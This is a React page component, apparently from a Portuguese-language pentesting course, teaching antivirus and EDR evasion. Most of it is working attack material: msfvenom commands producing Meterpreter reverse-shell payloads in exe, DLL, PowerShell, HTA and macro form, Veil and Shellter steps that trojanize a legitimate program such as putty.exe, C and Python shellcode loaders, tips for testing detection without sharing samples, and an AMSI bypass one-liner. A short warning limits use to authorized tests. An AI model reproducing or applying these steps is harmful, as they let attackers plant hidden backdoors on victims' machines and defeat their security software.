import { PageContainer } from "@/components/layout/PageContainer";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { AlertBox } from "@/components/ui/AlertBox";

export default function PayloadObfuscation() {
  return (
    <PageContainer
      title="Evasão de Antivírus & Ofuscação"
      subtitle="Técnicas para evadir antivírus, EDR e IDS: ofuscação de payloads, encoding, packers e geração de payloads indetectáveis."
      difficulty="avancado"
      timeToRead="18 min"
    >
      <h2>Por que Evadir AV?</h2>
      <p>
        Em pentests reais, os alvos têm antivírus, EDR (Endpoint Detection & Response) e IDS/IPS.
        Payloads do Metasploit e ferramentas conhecidas são detectados imediatamente. Técnicas de
        evasão são essenciais para simular ataques reais.
      </p>

      <AlertBox type="warning" title="Uso responsável">
        Estas técnicas devem ser usadas apenas em pentests autorizados para testar a eficácia
        das defesas do cliente. Nunca use para fins maliciosos.
      </AlertBox>

      <h2>Técnicas de Encoding</h2>
      <CodeBlock
        title="Encoding de payloads com msfvenom"
        code={`# Payload sem encoding (detectado por 90%+ dos AVs)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe

# Com encoder shikata_ga_nai (polimórfico)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 \\
  -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
# -i 5 = 5 iterações de encoding

# Múltiplos encoders encadeados
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 \\
  -e x86/shikata_ga_nai -i 3 \\
  -e x86/countdown -i 2 \\
  -f exe -o multi-encoded.exe

# Formatos diferentes (menos detectados que .exe)
# DLL
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f dll -o payload.dll
# PowerShell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f psh -o payload.ps1
# HTA
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f hta-psh -o payload.hta
# VBA (macro)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f vba -o payload.vba`}
      />

      <h2>Veil — Framework de Evasão</h2>
      <CodeBlock
        title="Gerar payloads com Veil"
        code={`# Instalar Veil
sudo apt install veil

# Executar
veil

# Menu:
# 1. Evasion  — gerar payloads evasivos
# 2. Ordnance — gerar shellcode

# Usar Evasion
use 1

# Listar payloads disponíveis
list

# Payloads populares:
# python/meterpreter/rev_tcp
# go/meterpreter/rev_tcp     (Go — boa evasão)
# cs/meterpreter/rev_tcp     (C# — boa evasão)
# ruby/meterpreter/rev_tcp

# Selecionar payload
use python/meterpreter/rev_tcp

# Configurar
set LHOST 192.168.1.100
set LPORT 4444

# Gerar
generate

# O Veil compila o payload com pyinstaller/etc.
# Resultado: /var/lib/veil/output/compiled/`}
      />

      <h2>Shellter — Injeção em Executáveis</h2>
      <CodeBlock
        title="Injetar payload em executável legítimo"
        code={`# Shellter injeta shellcode em executáveis Windows legítimos
sudo apt install shellter

# Executar (precisa do Wine)
shellter

# Modo automático:
# A — Automatic
# PE Target: /path/to/legit-program.exe  (ex: putty.exe)
# Payload: L (listed)
# Selecionar: windows/meterpreter/reverse_tcp
# LHOST: seu IP
# LPORT: 4444

# Resultado: putty.exe agora tem o payload embutido
# Quando a vítima abre o putty, ele funciona normalmente
# MAS também abre uma sessão meterpreter

# Dicas:
# - Use executáveis 32-bit (maior compatibilidade)
# - Programas com GUI funcionam melhor
# - Stealth mode mantém o programa funcionando`}
      />

      <h2>Payloads Customizados</h2>
      <CodeBlock
        title="Criar payloads do zero"
        code={`# Payload em C (difícil de detectar)
# 1. Gerar shellcode raw
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f c -o shellcode.c

# 2. Criar loader em C
cat << 'EOF' > loader.c
#include <windows.h>
#include <stdio.h>

unsigned char buf[] = 
"\\xfc\\xe8\\x82..."; // shellcode do msfvenom

int main() {
    void *exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buf, sizeof(buf));
    ((void(*)())exec)();
    return 0;
}
EOF

# 3. Compilar com MinGW
x86_64-w64-mingw32-gcc loader.c -o payload.exe -lws2_32

# Payload em Python (compilado com PyInstaller)
# 1. Gerar shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f py -o sc.py

# 2. Criar script Python
cat << 'PYEOF' > runner.py
import ctypes
buf = b"\\xfc\\xe8..."  # shellcode
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(buf), 0x3000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ptr, buf, len(buf))
ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(-1, -1)
PYEOF

# 3. Compilar com PyInstaller
pip install pyinstaller
pyinstaller --onefile --noconsole runner.py`}
      />

      <h2>Testar Detecção</h2>
      <CodeBlock
        title="Verificar taxa de detecção"
        code={`# NUNCA envie payloads reais para VirusTotal!
# VirusTotal compartilha amostras com vendors de AV

# Alternativas offline/privadas:
# antiscan.me — scan privado (não compartilha)
# nodistribute.com — verificação privada

# Testar localmente com ClamAV
sudo apt install clamav
clamscan payload.exe

# Testar com Windows Defender em VM
# 1. Copiar payload para VM Windows
# 2. Ver se Defender detecta
# 3. Se sim, modificar e testar de novo

# AMSI bypass (PowerShell)
# Desabilitar AMSI em memória antes de executar
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`}
      />
    </PageContainer>
  );
}
